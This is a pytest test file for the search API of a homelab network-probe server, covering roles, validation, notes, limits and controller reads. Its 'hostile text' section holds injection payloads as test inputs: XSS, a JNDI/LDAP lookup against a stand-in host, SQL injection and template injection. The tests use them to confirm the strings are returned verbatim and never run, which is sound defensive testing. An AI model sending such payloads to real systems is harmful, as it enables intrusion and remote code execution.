"""Global search over the API (issue #245)."""

import io
import json

import pytest

pytest.importorskip("fastapi")
pytest.importorskip("tomlkit")

from fastapi.testclient import TestClient  # noqa: E402
from jsonschema import Draft202012Validator  # noqa: E402
from server_support import CONFIG, auth_for, logged_in  # noqa: E402

from homelab_probe import logs  # noqa: E402
from homelab_probe.demo.session import DemoSession  # noqa: E402
from homelab_probe.notes import NotesStore  # noqa: E402
from homelab_probe.server.app import create_app  # noqa: E402
from homelab_probe.server.search_api import SEARCH_SCHEMA  # noqa: E402
from homelab_probe.server.service import ControllerService  # noqa: E402

SITE = "/api/v1/unifi/sites/default"
SEARCH = f"{SITE}/search"
NOTES_DIR = "snapshots/site-1"
GONE = "device:AA:BB:CC:00:00:09"


def make_app(tmp_path, ttl=0, **kwargs):
    session = DemoSession()
    app = create_app(CONFIG, state_dir=tmp_path, hosts=["testserver"], auth=auth_for(tmp_path),
                     service=ControllerService(CONFIG, session=session, ttl=ttl), **kwargs)
    app.state.fake = session
    return app


@pytest.fixture
def app(tmp_path):
    return make_app(tmp_path)


@pytest.fixture
def viewer(app):
    return logged_in(app, "bob")


@pytest.fixture
def admin(app):
    return logged_in(app, "alice")


def find(client, text, **params):
    return client.get(SEARCH, params={"q": text, **params})


def keys(body, kind):
    return [hit["key"] for hit in body["items"] if hit["kind"] == kind]


def add_note(tmp_path, subject=GONE, name="Retired Cabinet Switch", site="site-1"):
    NotesStore(tmp_path / "snapshots" / site, site).add(subject, "moved to the shelf", "alice", 1_900_000_000.0, name)


# -- who may ask, what comes back -------------------------------------------------------------------------------------

def test_both_roles_search_and_a_visitor_is_not_logged_in(app, viewer, admin):
    for client in (viewer, admin):
        response = find(client, "gateway")
        assert response.status_code == 200
        body = response.json()
        assert keys(body, "device") == ["AA:00:00:00:00:01"] and body["site"] == {"id": "site-1", "name": "Default"}
        assert body["query"] == "gateway" and body["limit"] == 10 and body["complete"] is True
        assert body["generated_at"].endswith("Z") and body["warnings"] == [
            "detail/statistics unavailable for 1 device(s)"]
    assert find(TestClient(app), "gateway").status_code == 401


def test_the_response_has_the_shape_the_schema_says(viewer):
    body = find(viewer, "10", limit=50).json()
    Draft202012Validator(SEARCH_SCHEMA).validate(body)
    assert set(body) == set(SEARCH_SCHEMA["required"])
    order = ("client", "device", "ssid", "network", "finding", "note").index
    assert [hit["kind"] for hit in body["items"]] == sorted((hit["kind"] for hit in body["items"]), key=order)
    assert {hit["kind"] for hit in body["items"]} >= {"client", "device", "network", "finding"}


def test_each_hit_has_the_kind_a_stable_key_and_a_label_to_deep_link_with(viewer):
    body = find(viewer, "10").json()
    assert {hit["kind"] for hit in body["items"]} >= {"client", "device", "network", "finding"}
    for hit in body["items"]:
        assert hit["key"] and hit["label"] and hit["matched"]
        if hit["kind"] in ("client", "device"):
            assert hit["key"] == hit["mac"]
    finding = next(hit for hit in find(viewer, "garage", limit=50).json()["items"] if hit["kind"] == "finding")
    listed = viewer.get(f"{SITE}/findings").json()["items"]
    assert finding["key"] in {item["id"] for item in listed}                         # the id the findings list uses


# -- spellings and sites ----------------------------------------------------------------------------------------------

@pytest.mark.parametrize("text", ["BB:00:00:00:00:02", "bb-00-00-00-00-02", "BB00.0000.0002", "bb0000000002"])
def test_every_spelling_of_a_mac_finds_the_same_client(viewer, text):
    assert keys(find(viewer, text).json(), "client") == ["BB:00:00:00:00:02"]


def test_every_spelling_of_an_ip_finds_the_same_client(app, viewer):
    app.state.fake.fx["clients"][1]["ipAddress"] = "FE80:0:0:0:0:0:0:BEEF"
    for text in ("fe80::beef", "FE80::BEEF", "fe80:0000:0000:0000:0000:0000:0000:beef"):
        assert keys(find(viewer, text).json(), "client") == ["BB:00:00:00:00:02"], text


def test_a_site_that_is_not_there_gives_an_error_and_no_hit(viewer):
    response = viewer.get("/api/v1/unifi/sites/other/search", params={"q": "gateway"})
    assert response.status_code == 404 and response.json()["error"] == "site_not_found"
    assert "items" not in response.json()


def test_the_notes_of_another_site_are_never_searched(tmp_path, viewer):
    add_note(tmp_path, name="Zebra Cabinet", site="other-site")
    body = find(viewer, "zebra").json()
    assert body["items"] == [] and body["complete"] is True and body["unavailable"] == []


def test_a_notes_file_that_names_another_site_is_not_searched_and_says_so(tmp_path, viewer):
    add_note(tmp_path, name="Zebra Cabinet", site="other-site")
    (tmp_path / "snapshots" / "site-1").mkdir(parents=True)
    (tmp_path / "snapshots" / "site-1" / "notes.json").write_text(
        (tmp_path / "snapshots" / "other-site" / "notes.json").read_text())
    body = find(viewer, "zebra").json()
    assert body["items"] == [] and body["unavailable"] == ["note"] and body["complete"] is False
    assert body["limitations"] == ["The notes could not be read, so none were searched."]
    assert find(viewer, "gateway").status_code == 200


# -- notes ------------------------------------------------------------------------------------------------------------

def test_a_device_that_is_gone_is_found_by_the_name_its_notes_were_written_under(tmp_path, viewer):
    add_note(tmp_path)
    body = find(viewer, "retired cabinet").json()
    assert body["items"] == [{"kind": "note", "key": GONE, "label": "Retired Cabinet Switch", "matched": ["name"],
                              "subject_kind": "device", "note_count": 1, "last_note_at": "2030-03-17T17:46:40Z"}]
    for text in ("aa:bb:cc:00:00:09", "AA-BB-CC-00-00-09", "aabb.cc00.0009"):
        assert keys(find(viewer, text).json(), "note") == [GONE], text
    assert find(viewer, "retired").json()["kinds"]["note"] == {"total": 1, "shown": 1}


def test_a_search_writes_nothing_and_does_not_create_the_notes(tmp_path, viewer):
    before = {path.name: path.stat().st_mtime_ns for path in tmp_path.rglob("*") if path.is_file()}
    assert find(viewer, "retired cabinet").json()["items"] == []
    assert not (tmp_path / "snapshots").exists()
    assert {path.name: path.stat().st_mtime_ns for path in tmp_path.rglob("*") if path.is_file()} == before


@pytest.mark.parametrize("damage", ["damaged", "link"])
def test_a_notes_file_that_cannot_be_used_does_not_fail_the_search(tmp_path, viewer, damage):
    directory = tmp_path / NOTES_DIR
    directory.mkdir(parents=True)
    if damage == "damaged":
        (directory / "notes.json").write_text("{not json")
    else:
        (tmp_path / "elsewhere").mkdir()
        (directory / "notes.json").symlink_to(tmp_path / "elsewhere" / "notes.json")
    body = find(viewer, "gateway").json()
    assert keys(body, "device") == ["AA:00:00:00:00:01"] and body["unavailable"] == ["note"]
    assert body["complete"] is False and str(tmp_path) not in json.dumps(body)


# -- validation -------------------------------------------------------------------------------------------------------

@pytest.mark.parametrize("params", [
    {}, {"q": ""}, {"q": "a"}, {"q": "x" * 65}, {"q": "  "}, {"q": " a "}, {"q": " " + "x" * 65}, {"q": "x" * 65 + " "},
    {"q": " " * 70}, {"q": " " * 70 + "a"}, {"q": "x" * 257}, {"q": " " * 100 + "x" * 65 + " " * 100},
    {"q": "ok", "limit": 0}, {"q": "ok", "limit": 51}, {"q": "ok", "limit": "many"}])
def test_a_search_text_or_limit_out_of_range_is_422_and_reads_nothing(app, viewer, params):
    before = len(app.state.fake.calls)
    response = viewer.get(SEARCH, params=params)
    assert response.status_code == 422 and response.json()["error"] == "invalid_parameter"
    assert len(app.state.fake.calls) == before


@pytest.mark.parametrize("text", [" " + "x" * 64, "x" * 64 + " ", "  " + "x" * 64 + "  ", "\t" + "x" * 64 + "\t",
                                  " " * 90 + "x" * 64 + " " * 90, " ab ", "  ab"])
def test_the_length_rule_is_about_the_trimmed_text_so_white_space_around_a_valid_query_is_fine(viewer, text):
    response = find(viewer, text)
    assert response.status_code == 200 and response.json()["query"] == text.strip()


def test_the_bounds_are_inclusive_and_blank_space_does_not_count(viewer):
    assert find(viewer, "x" * 64).status_code == 200 and find(viewer, "ab").status_code == 200
    assert find(viewer, "  gateway  ").json()["query"] == "gateway"
    assert find(viewer, "ab", limit=50).status_code == 200 and find(viewer, "ab", limit=1).status_code == 200
    response = find(viewer, "  ")
    assert response.json() == {"error": "invalid_parameter", "message": "The search text has 2 to 64 characters."}


def test_a_site_name_the_command_line_would_refuse_is_422(viewer):
    assert viewer.get("/api/v1/unifi/sites/a%3Fb/search", params={"q": "ok"}).status_code == 422


# -- limits -----------------------------------------------------------------------------------------------------------

def test_the_limit_is_per_kind_and_truncated_says_when_something_was_cut(viewer):
    body = find(viewer, "aa", limit=2).json()
    assert body["truncated"] is True and body["kinds"]["device"] == {"total": 4, "shown": 2}
    assert len(keys(body, "device")) == 2 and len(keys(body, "finding")) == 2
    whole = find(viewer, "aa", limit=50).json()
    assert whole["truncated"] is False and len(keys(whole, "device")) == 4
    assert find(viewer, "aa").json() == find(viewer, "aa", limit=10).json() | {"generated_at": whole["generated_at"]}


def test_the_same_data_gives_the_same_answer_every_time(viewer):
    first = find(viewer, "10", limit=50).json()
    assert [find(viewer, "10", limit=50).json() for _ in range(3)] == [first] * 3


# -- hostile text -----------------------------------------------------------------------------------------------------

HOSTILE = "<img src=x onerror=alert(1)>\u202e\x1b[31m ${jndi:ldap://x.example/a} \"'\\"


def test_hostile_names_come_back_verbatim_as_json_and_are_never_interpreted(app, viewer):
    fx = app.state.fake.fx
    fx["clients"][0]["name"] = HOSTILE
    fx["legacy_rest"]["wlanconf"][0]["name"] = HOSTILE
    fx["devices"][1]["name"] = HOSTILE
    response = find(viewer, "onerror")
    assert response.headers["content-type"] == "application/json"
    assert response.headers["x-content-type-options"] == "nosniff"
    assert "<img" in response.text and response.text.count(chr(0x202e)) >= 3        # raw text: nothing escaped or cut
    body = response.json()
    assert {hit["kind"]: hit["label"] for hit in body["items"] if hit["kind"] != "finding"} == {
        "client": HOSTILE, "device": HOSTILE, "ssid": HOSTILE}
    assert any(hit["kind"] == "finding" and HOSTILE in hit["label"] for hit in body["items"])
    assert find(viewer, "${jndi").json()["kinds"]["client"]["total"] == 1


@pytest.mark.parametrize("text", [".*", "a|b", "((", "[a-z]", "%%", "..", "' OR 1=1 --", "{{7*7}}"])
def test_a_search_text_is_never_a_pattern_and_never_breaks_the_request(viewer, text):
    response = find(viewer, text)
    assert response.status_code == 200 and response.json()["items"] == [], text


def test_the_search_text_is_not_written_to_the_log(app, viewer):
    stream = io.StringIO()
    logs.configure("json", "DEBUG", stream=stream)
    find(viewer, "Needle-Text-1234")
    assert "Needle-Text-1234" not in stream.getvalue()
    assert any(json.loads(line).get("route") == "/api/v1/unifi/sites/{site}/search"
               for line in stream.getvalue().splitlines() if "server.request" in line)


# -- reading ----------------------------------------------------------------------------------------------------------

def test_a_search_after_the_findings_list_reads_only_what_the_list_did_not(tmp_path):
    app = make_app(tmp_path, ttl=300)
    viewer = logged_in(app, "bob")
    session = app.state.fake
    assert viewer.get(f"{SITE}/findings").status_code == 200
    listed = list(session.calls)
    assert find(viewer, "gateway").status_code == 200
    new = [path for path in session.calls[len(listed):]]
    assert [path.rsplit("/", 1)[1] for path in new] == ["wlanconf"]            # the findings already read the rest
    assert len(session.posts) == 1                                              # the event log, once, for both
    again = len(session.calls)
    assert find(viewer, "switch").status_code == 200 and find(viewer, "10.0.0.1").status_code == 200
    assert len(session.calls) == again and len(session.posts) == 1


def test_a_search_makes_only_gets_and_the_one_event_log_query(app, viewer):
    find(viewer, "gateway")
    assert len(app.state.fake.posts) == 1 and app.state.fake.posts[0][0].endswith("/system-log/all")


def test_a_wifi_list_that_cannot_be_read_is_named_and_the_rest_is_searched(app, viewer):
    session = app.state.fake
    get = session.get

    def request(url, *args, **kwargs):
        if url.endswith("/rest/wlanconf"):
            from conftest import FakeResponse
            return FakeResponse(503, {})
        return get(url, *args, **kwargs)

    session.get = request
    body = find(viewer, "net").json()
    assert body["unavailable"] == ["ssid"] and body["complete"] is False and keys(body, "ssid") == []
    assert keys(body, "network") == ["net-wan"]
    assert "The Wi-Fi networks could not be read, so none were searched." in body["limitations"]
    assert any("wlanconf" in warning for warning in body["warnings"])


def test_a_controller_that_cannot_be_read_is_an_error_with_a_fixed_sentence(app, viewer):
    app.state.fake.status = 401
    response = find(viewer, "gateway")
    assert response.status_code == 502 and response.json() == {
        "error": "controller_unauthorized", "message": "The controller rejected the API key."}


def test_the_ignore_rules_apply_to_the_findings_searched(tmp_path):
    viewer = logged_in(make_app(tmp_path), "bob")
    assert keys(find(viewer, "device.offline").json(), "finding")
    (tmp_path / "hlp.toml").write_text('[[ignore]]\ncode = "device.offline"\nreason = "all"\n')
    assert keys(find(viewer, "device.offline").json(), "finding") == []


def test_a_settings_file_that_cannot_be_used_is_500_with_a_fixed_sentence(tmp_path):
    (tmp_path / "hlp.toml").write_text("this is [not valid")
    response = find(logged_in(make_app(tmp_path), "bob"), "gateway")
    assert response.status_code == 500 and response.json()["error"] == "settings_invalid"
    assert str(tmp_path) not in response.text


def test_a_read_only_server_searches_as_usual(tmp_path):
    viewer = logged_in(make_app(tmp_path, read_only=True), "bob")
    assert find(viewer, "gateway").status_code == 200


def test_the_route_is_in_the_openapi_document_as_a_get_with_its_parameters(viewer):
    spec = viewer.get("/api/v1/openapi.json").json()
    operation = spec["paths"]["/api/v1/unifi/sites/{site}/search"]["get"]
    parameters = {p["name"]: p for p in operation["parameters"]}
    assert set(spec["paths"]["/api/v1/unifi/sites/{site}/search"]) == {"get"}
    assert parameters["q"]["required"] is True and parameters["q"]["schema"]["minLength"] == 2
    assert parameters["q"]["schema"]["maxLength"] == 256 and parameters["limit"]["schema"]["maximum"] == 50
    assert "once trimmed" in parameters["q"]["description"] and "256 before trimming" in parameters["q"]["description"]
    assert {"200", "401", "404", "422", "500", "502", "504"} <= set(operation["responses"])
